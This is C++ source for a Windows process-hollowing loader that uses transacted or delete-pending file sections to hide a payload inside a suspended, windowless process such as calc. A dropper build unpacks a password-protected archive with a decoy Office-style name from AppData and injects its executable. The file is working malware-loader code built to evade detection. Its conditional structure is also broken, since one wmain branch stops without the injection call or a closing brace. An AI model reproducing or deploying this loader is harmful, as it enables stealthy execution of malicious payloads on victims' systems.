#include "settings.h"
#include "util.h"
#include <stdio.h>
#include "ntddk.h"
#include "kernel32_undoc.h"

#include "pe_hdrs_helper.h"
#include "hollowing_parts.h"

#ifdef DROPPER
#include "minizip.h"
#endif

#ifndef GHOSTING
#include <KtmW32.h>
#include "transacted_file.h"
#else
#include "delete_pending_file.h"
#endif

#include <ShlObj.h> // Для получения пути AppData

bool create_new_process_internal(PROCESS_INFORMATION& pi, LPWSTR cmdLine, LPWSTR startDir = NULL)
{
    if (!load_kernel32_functions()) return false;

    STARTUPINFOW si = { 0 };
    si.cb = sizeof(STARTUPINFOW);

    memset(&pi, 0, sizeof(PROCESS_INFORMATION));

    HANDLE hToken = NULL;
    HANDLE hNewToken = NULL;
    if (!CreateProcessInternalW(hToken,
        NULL, //lpApplicationName
        (LPWSTR)cmdLine, //lpCommandLine
        NULL, //lpProcessAttributes
        NULL, //lpThreadAttributes
        FALSE, //bInheritHandles
        CREATE_SUSPENDED | DETACHED_PROCESS | CREATE_NO_WINDOW, //dwCreationFlags
        NULL, //lpEnvironment 
        startDir, //lpCurrentDirectory
        &si, //lpStartupInfo
        &pi, //lpProcessInformation
        &hNewToken
    ))
    {
        DEBUG_ERR("CreateProcessInternalW failed, Error = " << std::hex << GetLastError());
        return false;
    }
    return true;
}

PVOID map_buffer_into_process(HANDLE hProcess, HANDLE hSection)
{
    NTSTATUS status = STATUS_SUCCESS;
    SIZE_T viewSize = 0;
    PVOID sectionBaseAddress = 0;

    if ((status = NtMapViewOfSection(hSection, hProcess, &sectionBaseAddress, NULL, NULL, NULL, &viewSize, ViewShare, NULL, PAGE_READONLY)) != STATUS_SUCCESS)
    {
        if (status == STATUS_IMAGE_NOT_AT_BASE) {
            DEBUG_ERR("[WARNING] Image could not be mapped at its original base! If the payload has no relocations, it won't work!\n");
        }
        else {
            DEBUG_ERR("[ERROR] NtMapViewOfSection failed, status: " << std::hex << status << std::endl);
            return NULL;
        }
    }
    DEBUG_MSG("Mapped Base:\t" << std::hex << (ULONG_PTR)sectionBaseAddress << "\n");
    return sectionBaseAddress;
}

bool transacted_hollowing(wchar_t* targetPath, BYTE* payladBuf, DWORD payloadSize)
{
    wchar_t dummy_name[MAX_PATH] = { 0 };
    wchar_t temp_path[MAX_PATH] = { 0 };
    DWORD size = GetTempPathW(MAX_PATH, temp_path);
    GetTempFileNameW(temp_path, L"TH", 0, dummy_name);

#ifndef GHOSTING
    HANDLE hSection = make_transacted_section(dummy_name, payladBuf, payloadSize);
#else
    HANDLE hSection = make_section_from_delete_pending_file(dummy_name, payladBuf, payloadSize);
#endif

    if (!hSection || hSection == INVALID_HANDLE_VALUE) {
        DEBUG_MSG("Creating transacted section has failed!");
        return false;
    }
    wchar_t* start_dir = NULL;
    wchar_t dir_path[MAX_PATH] = { 0 };
    get_directory(targetPath, dir_path, NULL);
    if (wcsnlen(dir_path, MAX_PATH) > 0) {
        start_dir = dir_path;
    }
    PROCESS_INFORMATION pi = { 0 };

    if (!create_new_process_internal(pi, targetPath, start_dir)) {
        DEBUG_ERR("Creating process failed!\n");
        return false;
    }
    DEBUG_MSG("Created Process, PID: " << std::dec << pi.dwProcessId << std::endl);
    HANDLE hProcess = pi.hProcess;
    PVOID remote_base = map_buffer_into_process(hProcess, hSection);
    if (!remote_base) {
        DEBUG_ERR("Failed mapping the buffer!\n");
        return false;
    }
    bool isPayl32b = !pe_is64bit(payladBuf);
    if (!redirect_to_payload(payladBuf, remote_base, pi, isPayl32b)) {
        DEBUG_ERR("Failed to redirect!\n");
        return false;
    }
    DEBUG_MSG("Resuming, PID " << std::dec << pi.dwProcessId << std::endl);
    //Resume the thread and let the payload run:
    ResumeThread(pi.hThread);
    return true;
}


#ifndef DROPPER
#pragma comment(linker, "/SUBSYSTEM:CONSOLE")
int wmain(int argc, wchar_t* argv[]) {

    wchar_t defaultTarget[MAX_PATH] = { 0 };
    bool useDefaultTarget = (argc > 2) ? false : true;
    wchar_t* targetPath = (argc > 2) ? argv[2] : defaultTarget;
    size_t payloadSize = 0;
    if (argc < 2) {
#ifndef GHOSTING
        DEBUG_MSG("\nTransacted Hollowing " << "\n\tparams: <payload path> [*target path]\n" << "\t* - optional\n");
#else
        DEBUG_MSG("\nGhostly Hollowing " << "\n\tparams: <payload path> [*target path]\n" << "\t* - optional\n\tExample: GhostlyHollowing.exe payload.exe %SystemRoot%\\SysWoW64\\calc.exe");
#endif
        if (IS32BIT) {
            DEBUG_MSG("32bit\n");
        }
        else {
            DEBUG_MSG("64bit\n");
        }
        return 0;
    }

    wchar_t* payloadPath = argv[1];

    BYTE* payloadBuf = buffer_payload(payloadPath, payloadSize);
    if (payloadBuf == NULL) {
        DEBUG_ERR("Cannot read payload!" << std::endl);
        return -1;
    }
#else
#pragma comment(linker, "/SUBSYSTEM:CONSOLE")
int wmain(int argc, wchar_t* argv[]) {

    wchar_t defaultTarget[MAX_PATH] = { 0 };
    bool useDefaultTarget = (argc > 2) ? false : true;
    wchar_t* targetPath = (argc > 2) ? argv[2] : defaultTarget;
    size_t payloadSize = 0;

    // GetPath AppData\Roaming
    wchar_t appDataPath[MAX_PATH] = { 0 };
    if (FAILED(SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, appDataPath))) {
        DEBUG_ERR("Error get path AppData\\Roaming.\n");
        return -1;
    }

    std::wstring zipFilePath = std::wstring(appDataPath) + L"\\OfficeHelper2016.zip"; // Change it

    std::string zipFilePathStr(zipFilePath.begin(), zipFilePath.end());

    std::string password = "super_secret_password"; // Change it
    std::string payloadFileName = "OfficeHelper2016.exe"; // Change it

    DEBUG_MSG("Save archive in: " << zipFilePath << std::endl);
    DEBUG_MSG("Zip password: " << password << std::endl);
    DEBUG_MSG("payloadFileName: " << payloadFileName << std::endl);

    BYTE* payloadBuf = NULL;
    if (!unzip_payload(zipFilePathStr, password, payloadFileName, &payloadBuf, &payloadSize)) {
        DEBUG_ERR("Error while reading payload from archive\n");
        return -1;
    }

    bool isPayl32b = !pe_is64bit(payloadBuf);
    if (IS32BIT && !isPayl32b) {
        DEBUG_ERR("The payload (32 bit) is not compatibile with the payload (64 bit)\n");
        return 1;
    }

    if (useDefaultTarget) {
        get_calc_path(defaultTarget, MAX_PATH, isPayl32b);
    }

    bool is_ok = transacted_hollowing(targetPath, payloadBuf, (DWORD)payloadSize);

    free_buffer(payloadBuf);
    if (is_ok) {
        DEBUG_MSG("[+] Done!" << std::endl);
    }
    else {
        DEBUG_ERR("[-] Failed!" << std::endl);
        return -1;
    }
    return 0;
}
#endif